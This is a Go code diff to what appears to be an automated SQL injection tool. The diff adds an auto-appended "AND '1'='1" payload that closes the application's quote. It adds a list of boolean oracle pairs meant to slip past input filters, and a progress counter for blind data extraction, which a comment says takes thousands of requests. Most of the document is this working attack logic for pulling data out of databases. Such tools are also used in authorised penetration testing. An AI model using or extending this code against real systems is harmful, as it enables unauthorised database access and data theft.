@@ -6,6 +6,7 @@ import (
 	"strconv"
 	"strings"
 	"sync"
+	"sync/atomic"
 	"time"
 )
 
@@ -20,6 +21,7 @@ type Executor struct {
 	trueBody  string
 	falseBody string
 	baseline  time.Duration
+	probes    int64
 
 	// raw disables payload transformation for the next request. It is used as
 	// a fallback when a tamper chain breaks an otherwise working boundary.
@@ -89,6 +91,13 @@ func bypassInline(fragment string) string {
 // Request injects a fragment using the confirmed boundary.
 func (x *Executor) Request(fragment string) (string, int, error) {
 	payload := x.S.Boundary.Prefix + x.TransformFragment(fragment) + x.S.Boundary.Suffix
+	// When the application supplies the closing quote (empty suffix), the
+	// payload has to end with an open string literal so that quote is consumed
+	// instead of dangling. "AND '1'='1" is a tautology on every SQL engine and
+	// doubles as the guard.
+	if x.S.Boundary.Suffix == "" && !strings.HasSuffix(strings.TrimSpace(fragment), "'1'='1") {
+		payload += " AND '1'='1"
+	}
 	body, length, _, err := x.E.RequestAt(x.S.Point, payload)
 	return body, length, err
 }
@@ -440,13 +449,33 @@ func (x *Executor) binarySearch(low, high int, predicate func(int) bool) (int, e
 	return result, nil
 }
 
+// oraclePairs are candidate reference conditions, cheapest and most common
+// first. Some filters reject the bare numeric comparison "1=1" while allowing
+// the equivalent quoted string comparison, so the oracle form is discovered
+// instead of assumed.
+var oraclePairs = [][2]string{
+	{" AND '1'='1'", " AND '1'='2'"},
+	{" AND 1=1", " AND 1=2"},
+	{" AND 'a'='a'", " AND 'a'='b'"},
+	{" AND 1 LIKE 1", " AND 1 LIKE 2"},
+}
+
 // booleanOracle evaluates a condition by comparing its response with known
 // true and false reference responses.
 func (x *Executor) booleanOracle(cond string) bool {
 	x.mu.Lock()
 	if x.trueBody == "" || x.falseBody == "" {
-		x.trueBody = x.booleanRequest(" AND 1=1")
-		x.falseBody = x.booleanRequest(" AND 1=2")
+		for _, pair := range oraclePairs {
+			trueBody := x.booleanRequest(pair[0])
+			falseBody := x.booleanRequest(pair[1])
+			if trueBody == "" || falseBody == "" {
+				continue
+			}
+			if responsesDiffer(trueBody, falseBody) {
+				x.trueBody, x.falseBody = trueBody, falseBody
+				break
+			}
+		}
 	}
 	trueBody, falseBody := x.trueBody, x.falseBody
 	x.mu.Unlock()
@@ -457,6 +486,11 @@ func (x *Executor) booleanOracle(cond string) bool {
 	body := x.booleanRequest(" AND (" + cond + ")")
 	if body == "" {
 		return false
+	}
+	// A blind extraction is thousands of requests; report movement so a long
+	// dump never looks like a hang.
+	if n := atomic.AddInt64(&x.probes, 1); n%50 == 0 && x.E.Opts.Verbose >= 1 {
+		x.E.Log.Info(fmt.Sprintf("blind extraction progress: %d oracle probes", n))
 	}
 	return responsesSimilar(body, trueBody) && responsesDiffer(body, falseBody)
 }
